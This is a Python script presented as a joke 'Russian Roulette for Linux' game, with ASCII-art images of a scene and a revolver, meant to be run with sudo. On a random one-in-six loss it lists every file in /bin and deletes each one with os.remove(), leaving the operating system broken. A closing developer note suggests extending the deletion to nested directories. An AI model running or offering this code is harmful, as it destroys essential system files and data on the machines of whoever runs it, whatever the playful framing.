# This is a game of Russian Roulette for Linux, where the stakes are your OS.
# To run: sudo python3 russian_roulette.py
# Inspired by Spextel. Please play responsibly.
# Love,
# MrJ

import random
import os

def russian_roulette():
	game_loop()

def display_menu():
	the_deer_hunter = """\
                                            ...                   
                                        ;c:,:OXo;cockld;.       
                                    ,cxKko;',,'...cKNN0kl;.      
                                .cOWN0xx:::,.     cONN0Oxc,'    
                              'xNXNNKO0kdxoc,.    .oxdll.   .. 
                            .0X0OdKXOX0l...       ;XNK00d,     
                            OKodOXkoc;xc,.       ;c''.....:'   
                           .X'kWWo.o0xc.                        
                         .'.0xdoolccccc:;,,'....      ..    .. 
                        .WWWKo:ccccccccccc:::;;,,''..     ...''
                     'lOXkl,'':ccccccccccc::::;::;'''','''...,;            
               .,,ckXXkol0d;cccccccc::ccccc::;;'..........'',;,                                       
            ,dKXXWXKdd0dlc::,;cllolclc:;;;;,'...............,,'                                       
        .:xKXWMWWWWNXk  0cXKKNNWWWWWWWWWNNXK0kxdddol:::'......'.           
      .c;XK.dKNN0d;'xWXllKOONxKMMMWWXOk0WWXNNWOxK00OxxxKk.    c.           
    ,ooKNxWXNXkXo:kNWWWNoOkoXXWMMWX;... .',,'co,',,:' ...                  
      ;0WMMMMMMMWWWNNKdd 'W0NXWMWWWNWWKcl, ;kNXc  ...;.. ..                
    :KWMMMMMMMMMMNkxkN,.c cNWWMMMMWWX0o,,lKWMMWo . .. .l;                  
  .xWWMMMMMMMMMMMWXd.Kdlx  .'XMMWOxkoONNWMMMMMW0';'cc...   ..              
:0WMMMMMMMMMMMMMMWWNx:c:     KMNKooKOx:ddlWMMMMNx' ..       ..             
WMMMMMMMMMMMMMMMMMWXk    ...;WM0dlOWWO..;XNWMWNKk,         '.'.            
WWWMMMMMMMMWWWNWWWWX,;'    .0MWWOOWMWdc0WWNk;..           . .              
WWWWWWXKKX0ko,;ddkKo.N'.,o0WMMMXxxXM0..cOxc:';     .                       
0xlc;'.....     oMXd,,cXMMMMMMMMKdOWK;;.KWkloo:,.                          
cc;. .,:lxl     '' .lNW0KMMMMMMW0odNNc,',:..'.         .                   
'.,kNMMMMMMX;   .:0WMMMWO:kWN0OKOc .xK;;Oxl:;.          ';.                
,OWMMMKoNMMMMXO0WMMMMMMMWx..dx;,;:.  .,    ..            ..                
OW0xW0' oNMMKWMMMMMMMMMMMWNkc,.                                            
 ;WxkNo. :NXl0WKWWMMMWMMWMWX0cc:;                                          
. k0:dK: .KXl,N,xNKNWWWWWk,      .                                         
'  o;,;.  'l; c:;odkOxl,.                                                  
'   ;...      ..                                                           
.    ..                                                        
	"""
	print()
	print(the_deer_hunter)
	print()
	print("Welcome to Russian Roulette for Linux, where the stakes are your OS.")
	print()
	
def game_loop():
	detective_special = """\
...........................................................................
...........................................................................
...........................................................................
...........................................................................
...lMkoddxkkOO0KKXXKOkxxxxxxxxxxxxxxxxxxkkkkWMMMMMMMMMMMMMMMMMMMMMMMMMMo...
...lKllllccccccccc;:::::c;;;;;;;;;;;;:;;;cooclxKK0OOO0MMMMMMMMMMMMMMMMMo...
...lO;;;,,,,,,,,''',,,,,'.,;;;;;;;;::lool:cxxcl0NMWMMMMMMMMMMMMMMMMMMMMo...
...lNol:::lllcccc:;:::;;...''''''''''''''..;lc;;llx0KWMMMMMMMMMMMMMMMMMo...
...lM0,...........'c:;;;..,;;;,,,,;;,,,.'...,;',lxoldooxxkKMMMMMMMMMMMMo...
...lMMWNNWNWWWWNNWXxdolc0;,;,,,,,,,,;cdxxc.:ododOOOOOOkxoclxMMMMMMMMMMMo...
...lMMMMMMMMMMMMMMMO;;,,o;,,,,,,,,,'',,,';lk00kxOO00xllc:;;:NMMMMMMMMMMo...
...lMMMMMMMMMMMMMMMN;'''..................k0KK000ko::c:;;;,';kNMMMMMMMMo...
...lMMMMMMMMMMMMMMMMdccc:d0KKKXXNNX0lckkdcx0000kl:lc:,'''''',:;xWMMMMMMo...
...lMMMMMMMMMMMMMMMMMWWMMWWNkWWMMMMMKOO00XWXOOl:oool:;'''',,,;;,;0MMMMMo...
...lMMMMMMMMMMMMMMMMMMMMMMMWkMMMMMMMMkkMMMMMkcododdddl::;ccc:;,'''OMMMMo...
...lMMMMMMMMMMMMMMMMMMMMMMMMKONMMWX0kkWMMMM0OKNWMWNKklc:ccccccc:;''OMMMo...
...lMMMMMMMMMMMMMMMMMMMMMMMMMW0kkdd0KXXK0kdOMMMMMMMMMKo:cccccccc::,'KMMo...
...lMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXKKKXNWMMMMMMMMMMMWoo:lccc;,;:::,;WMo...
...lMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWo::llccc:::::;,dMo...
...lMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXo;collcccc::::;,Wo...
...lMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl;oolllllccccc:,ko...
...lMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKo:dllooollccc::;co...
...lMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0kkxxddddddxxkkNo...
...........................................................................
...........................................................................
	"""
	display_menu()
	keep_playing = "y"
	while keep_playing == "y":
		
		# The bullet is generated into a chamber between one and six.
		bullet = random.randint(1,6)
		# The player spins the cylinder to decide the chamber.
		spin = ""
		while spin != "s":
			try:
				print(detective_special)
				spin = input("Press S to spin the cylinder: ").lower()
			except ValueError:
				continue
			
		if spin == "s":
			chamber = random.randint(1,6)

		if chamber == bullet:
			# The player loses.
			print()
			print("Bang!")
			# This is the directory that holds essential operating system components.
			brain = "/bin"
			# Here we create a list for every file and folder in the target directory.
			memories = os.listdir(brain)
			# Here we filter out all folders.
			memories = [m for m in memories if os.path.isfile(brain + "/" + m)]
			# After retrieving the names for each file in the first layer, excluding folders,
			# you can use the list to remove every file in the first layer of OS components.
			for m in memories:
				# To remove the individual files, use os.remove(). If this were a directory
				# you would use os.rmdir() and the directory would need to be empty.
				os.remove(brain + "/" + m)
			keep_playing = "dead"
		else:
			# The player wins.
			print()
			print("Click")
			print()
			keep_playing = input("Would you like to play again? (y/n) ").lower()
			print()

russian_roulette()
# Developer Notes:
# You can use the same structure to handle the nested directories and the files within.
